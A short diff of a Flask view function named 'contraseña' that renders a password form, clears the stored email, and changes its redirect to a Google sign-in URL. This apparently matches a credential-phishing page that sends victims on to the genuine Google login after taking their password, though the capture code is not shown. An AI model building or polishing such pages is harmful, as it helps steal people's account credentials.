@@ -33,7 +33,7 @@ def contraseña():
         )
 
         session.pop('email', None)
-        return redirect('https://myaccount.google.com')
+        return redirect('https://accounts.google.com/v3/signin/accountchooser?dsh=S-366602044%3A1764778949071449&elo=1&ifkv=ARESoU0tUycXDLUAiz5KUHSb61jq4MLLEHaUybCjwOEXRJQM5zfM2q2IIqaQ4qYh14AyzjwCo80b&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
 
     return render_template('password.html', form=form)
 
